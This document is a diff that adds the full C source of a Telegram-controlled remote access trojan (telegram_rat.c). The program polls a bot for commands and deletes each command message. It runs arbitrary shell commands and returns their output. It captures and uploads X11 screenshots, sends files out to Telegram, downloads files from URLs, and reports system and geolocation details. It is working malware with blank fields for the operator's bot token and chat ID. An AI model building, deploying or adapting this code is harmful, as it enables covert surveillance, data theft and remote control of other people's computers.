@@ -1,0 +1,352 @@
+// telegram_rat.c
+// Build: gcc telegram_rat.c -o rat -lcurl -lpng -lX11
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/utsname.h>
+#include <sys/types.h>
+#include <pwd.h>
+#include <curl/curl.h>
+
+#ifdef __linux__
+#include <X11/Xlib.h>
+#include <X11/Xutil.h>
+#endif
+
+#define TOKEN   ""   // <-- put token here
+#define CHAT_ID ""   // <-- put chat id here
+
+/* ---------- Dynamic string buffer ---------- */
+typedef struct { char *data; size_t len; } Buf;
+
+static size_t write_cb(void *ptr, size_t size, size_t nmemb, void *userdata) {
+    size_t total = size * nmemb;
+    Buf *b = (Buf *)userdata;
+    char *n = realloc(b->data, b->len + total + 1);
+    if (!n) return 0;
+    b->data = n;
+    memcpy(b->data + b->len, ptr, total);
+    b->len += total;
+    b->data[b->len] = 0;
+    return total;
+}
+
+/* ---------- Telegram helpers ---------- */
+static void tg_delete_message(long msg_id) {
+    CURL *c = curl_easy_init();
+    if (!c) return;
+    char url[512];
+    snprintf(url, sizeof(url),
+             "https://api.telegram.org/bot%s/deleteMessage?chat_id=%s&message_id=%ld",
+             TOKEN, CHAT_ID, msg_id);
+    curl_easy_setopt(c, CURLOPT_URL, url);
+    curl_easy_setopt(c, CURLOPT_TIMEOUT, 10L);
+    curl_easy_perform(c);
+    curl_easy_cleanup(c);
+}
+
+static int tg_send_message(const char *text) {
+    CURL *c = curl_easy_init();
+    if (!c) return -1;
+    char *enc = curl_easy_escape(c, text, 0);
+    char *url = malloc(strlen(enc) + 512);
+    sprintf(url, "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
+            TOKEN, CHAT_ID, enc);
+    curl_easy_setopt(c, CURLOPT_URL, url);
+    curl_easy_setopt(c, CURLOPT_TIMEOUT, 20L);
+    CURLcode r = curl_easy_perform(c);
+    free(url); curl_free(enc);
+    curl_easy_cleanup(c);
+    return r == CURLE_OK ? 0 : -1;
+}
+
+static int tg_send_file(const char *path) {
+    CURL *c = curl_easy_init();
+    if (!c) return -1;
+    struct curl_httppost *post = NULL, *last = NULL;
+    curl_formadd(&post, &last,
+                 CURLFORM_COPYNAME, "chat_id",
+                 CURLFORM_COPYCONTENTS, CHAT_ID, CURLFORM_END);
+    curl_formadd(&post, &last,
+                 CURLFORM_COPYNAME, "document",
+                 CURLFORM_FILE, path, CURLFORM_END);
+    char url[256];
+    snprintf(url, sizeof(url), "https://api.telegram.org/bot%s/sendDocument", TOKEN);
+    curl_easy_setopt(c, CURLOPT_URL, url);
+    curl_easy_setopt(c, CURLOPT_HTTPPOST, post);
+    curl_easy_setopt(c, CURLOPT_TIMEOUT, 60L);
+    CURLcode r = curl_easy_perform(c);
+    curl_formfree(post);
+    curl_easy_cleanup(c);
+    return r == CURLE_OK ? 0 : -1;
+}
+
+/* ---------- JSON helper: extract "text":"..." from a message ---------- */
+static int extract_field(const char *json, const char *key, char *out, size_t outsz) {
+    char pattern[64];
+    snprintf(pattern, sizeof(pattern), "\"%s\":\"", key);
+    const char *p = strstr(json, pattern);
+    if (!p) return 0;
+    p += strlen(pattern);
+    size_t i = 0;
+    while (*p && *p != '"' && i < outsz - 1) {
+        if (*p == '\\' && p[1]) p++;   // basic escape handling
+        out[i++] = *p++;
+    }
+    out[i] = 0;
+    return 1;
+}
+
+static int extract_number(const char *json, const char *key, long *out) {
+    char pattern[64];
+    snprintf(pattern, sizeof(pattern), "\"%s\":", key);
+    const char *p = strstr(json, pattern);
+    if (!p) return 0;
+    p += strlen(pattern);
+    while (*p == ' ') p++;
+    *out = atol(p);
+    return 1;
+}
+
+/* ---------- Command implementations ---------- */
+static char *cmd_info(void) {
+    static char buf[2048];
+    struct utsname u;
+    uname(&u);
+    struct passwd *pw = getpwuid(getuid());
+    snprintf(buf, sizeof(buf),
+        "System: %s\nNode: %s\nRelease: %s\nVersion: %s\nMachine: %s\nUsername: %s",
+        u.sysname, u.nodename, u.release, u.version, u.machine,
+        pw ? pw->pw_name : "unknown");
+    return buf;
+}
+
+static char *cmd_location(void) {
+    static char out[1024];
+    Buf b = {0};
+    CURL *c = curl_easy_init();
+    if (!c) { strcpy(out, "curl init failed"); return out; }
+    curl_easy_setopt(c, CURLOPT_URL, "https://ifconfig.me/ip");
+    curl_easy_setopt(c, CURLOPT_WRITEFUNCTION, write_cb);
+    curl_easy_setopt(c, CURLOPT_WRITEDATA, &b);
+    curl_easy_setopt(c, CURLOPT_TIMEOUT, 15L);
+    curl_easy_perform(c);
+    curl_easy_cleanup(c);
+    if (!b.data) { strcpy(out, "Failed to get IP"); return out; }
+
+    // Strip trailing whitespace
+    for (int i = (int)b.len - 1; i >= 0 && (b.data[i] == '\n' || b.data[i] == ' '); i--)
+        b.data[i] = 0;
+
+    char ip_url[512];
+    snprintf(ip_url, sizeof(ip_url), "http://ip-api.com/json/%s", b.data);
+    free(b.data); b.data = NULL; b.len = 0;
+
+    c = curl_easy_init();
+    curl_easy_setopt(c, CURLOPT_URL, ip_url);
+    curl_easy_setopt(c, CURLOPT_WRITEFUNCTION, write_cb);
+    curl_easy_setopt(c, CURLOPT_WRITEDATA, &b);
+    curl_easy_setopt(c, CURLOPT_TIMEOUT, 15L);
+    curl_easy_perform(c);
+    curl_easy_cleanup(c);
+
+    if (!b.data) { strcpy(out, "Failed to get location"); return out; }
+    // Just send raw JSON — simpler than parsing
+    snprintf(out, sizeof(out), "%s", b.data);
+    free(b.data);
+    return out;
+}
+
+static char *cmd_help(void) {
+    static char h[] =
+        "HELP MENU:\n"
+        "Any shell command | executed via /bin/sh\n"
+        "cd ..             | change directory up\n"
+        "cd foldername     | change directory\n"
+        "download filename | send file to Telegram\n"
+        "screenshot        | capture screenshot (X11)\n"
+        "info              | system info\n"
+        "location          | IP-based geolocation\n"
+        "get url           | download file from URL\n";
+    return h;
+}
+
+#ifdef __linux__
+static int take_screenshot(const char *path) {
+    Display *d = XOpenDisplay(NULL);
+    if (!d) return -1;
+    Window root = DefaultRootWindow(d);
+    XWindowAttributes attr;
+    XGetWindowAttributes(d, root, &attr);
+    XImage *img = XGetImage(d, root, 0, 0, attr.width, attr.height, AllPlanes, ZPixmap);
+    if (!img) { XCloseDisplay(d); return -1; }
+
+    // Write minimal PPM (portable pixmap — easy, no libpng required)
+    FILE *f = fopen(path, "wb");
+    if (!f) { XDestroyImage(img); XCloseDisplay(d); return -1; }
+    fprintf(f, "P6\n%d %d\n255\n", attr.width, attr.height);
+    for (int y = 0; y < attr.height; y++) {
+        for (int x = 0; x < attr.width; x++) {
+            unsigned long pix = XGetPixel(img, x, y);
+            unsigned char r = (pix >> 16) & 0xFF;
+            unsigned char g = (pix >>  8) & 0xFF;
+            unsigned char b =  pix        & 0xFF;
+            fputc(r, f); fputc(g, f); fputc(b, f);
+        }
+    }
+    fclose(f);
+    XDestroyImage(img);
+    XCloseDisplay(d);
+    return 0;
+}
+#endif
+
+/* ---------- Dispatch ---------- */
+static void execute_command(const char *cmd) {
+    char result[8192] = {0};
+
+    if (strcmp(cmd, "help") == 0) {
+        strcpy(result, cmd_help());
+    } else if (strcmp(cmd, "info") == 0) {
+        snprintf(result, sizeof(result), "%s", cmd_info());
+    } else if (strcmp(cmd, "location") == 0) {
+        snprintf(result, sizeof(result), "%s", cmd_location());
+    } else if (strcmp(cmd, "cd ..") == 0) {
+        if (chdir("..") == 0) {
+            char cwd[512];
+            snprintf(result, sizeof(result), "CWD: %s",
+                     getcwd(cwd, sizeof(cwd)) ? cwd : "?");
+        } else strcpy(result, "chdir failed");
+    } else if (strncmp(cmd, "cd ", 3) == 0) {
+        if (chdir(cmd + 3) == 0) {
+            char cwd[512];
+            snprintf(result, sizeof(result), "CWD: %s",
+                     getcwd(cwd, sizeof(cwd)) ? cwd : "?");
+        } else strcpy(result, "chdir failed");
+    } else if (strcmp(cmd, "screenshot") == 0) {
+#ifdef __linux__
+        if (take_screenshot("screenshot.ppm") == 0) {
+            tg_send_file("screenshot.ppm");
+            unlink("screenshot.ppm");
+            strcpy(result, "Screenshot sent.");
+        } else strcpy(result, "Screenshot failed.");
+#else
+        strcpy(result, "Screenshot not implemented on this platform.");
+#endif
+    } else if (strncmp(cmd, "download ", 9) == 0) {
+        const char *fn = cmd + 9;
+        if (access(fn, F_OK) == 0) {
+            if (tg_send_file(fn) == 0)
+                snprintf(result, sizeof(result), "File '%s' sent.", fn);
+            else strcpy(result, "Failed to send file.");
+        } else snprintf(result, sizeof(result), "File '%s' not found.", fn);
+    } else if (strncmp(cmd, "get ", 4) == 0) {
+        const char *url = cmd + 4;
+        Buf b = {0};
+        CURL *c = curl_easy_init();
+        curl_easy_setopt(c, CURLOPT_URL, url);
+        curl_easy_setopt(c, CURLOPT_WRITEFUNCTION, write_cb);
+        curl_easy_setopt(c, CURLOPT_WRITEDATA, &b);
+        curl_easy_setopt(c, CURLOPT_FOLLOWLOCATION, 1L);
+        curl_easy_setopt(c, CURLOPT_TIMEOUT, 60L);
+        if (curl_easy_perform(c) == CURLE_OK && b.data) {
+            const char *slash = strrchr(url, '/');
+            const char *fname = slash ? slash + 1 : "download.bin";
+            FILE *f = fopen(fname, "wb");
+            if (f) {
+                fwrite(b.data, 1, b.len, f);
+                fclose(f);
+                snprintf(result, sizeof(result), "Saved as %s (%zu bytes).",
+                         fname, b.len);
+            } else strcpy(result, "Could not write file.");
+        } else strcpy(result, "Download failed.");
+        free(b.data);
+        curl_easy_cleanup(c);
+    } else {
+        // Passthrough: run via popen
+        char wrapped[4096];
+        snprintf(wrapped, sizeof(wrapped), "%s 2>&1", cmd);
+        FILE *p = popen(wrapped, "r");
+        if (!p) { strcpy(result, "popen failed"); }
+        else {
+            size_t n = fread(result, 1, sizeof(result) - 1, p);
+            result[n] = 0;
+            pclose(p);
+        }
+    }
+
+    if (result[0]) tg_send_message(result);
+}
+
+/* ---------- Polling ---------- */
+static long get_updates(long offset, char **out_json) {
+    CURL *c = curl_easy_init();
+    Buf b = {0};
+    char url[512];
+    if (offset > 0)
+        snprintf(url, sizeof(url),
+            "https://api.telegram.org/bot%s/getUpdates?offset=%ld&timeout=20",
+            TOKEN, offset);
+    else
+        snprintf(url, sizeof(url),
+            "https://api.telegram.org/bot%s/getUpdates?timeout=20", TOKEN);
+
+    curl_easy_setopt(c, CURLOPT_URL, url);
+    curl_easy_setopt(c, CURLOPT_WRITEFUNCTION, write_cb);
+    curl_easy_setopt(c, CURLOPT_WRITEDATA, &b);
+    curl_easy_setopt(c, CURLOPT_TIMEOUT, 30L);
+    curl_easy_perform(c);
+    curl_easy_cleanup(c);
+
+    *out_json = b.data;
+    return 0;
+}
+
+static void handle_updates(const char *json) {
+    const char *p = json;
+    while ((p = strstr(p, "\"update_id\":")) != NULL) {
+        long update_id = 0, msg_id = 0;
+        extract_number(p, "update_id", &update_id);
+
+        // Find this update's "text"
+        char text[4096] = {0};
+        long this_msg_id = 0;
+        const char *m = strstr(p, "\"message\":{");
+        if (m && extract_field(m, "text", text, sizeof(text))) {
+            extract_number(m, "message_id", &this_msg_id);
+            msg_id = this_msg_id;
+            tg_delete_message(msg_id);
+            execute_command(text);
+        }
+        p++;
+    }
+}
+
+int main(void) {
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+    long offset = 0;
+    char *json = NULL;
+
+    while (1) {
+        get_updates(offset, &json);
+        if (json) {
+            // Find the highest update_id to set next offset
+            const char *p = json;
+            long highest = offset;
+            while ((p = strstr(p, "\"update_id\":")) != NULL) {
+                long id = 0;
+                extract_number(p, "update_id", &id);
+                if (id >= highest) highest = id + 1;
+                p++;
+            }
+            handle_updates(json);
+            offset = highest;
+            free(json);
+            json = NULL;
+        }
+        sleep(1);
+    }
+    curl_global_cleanup();
+    return 0;
+}
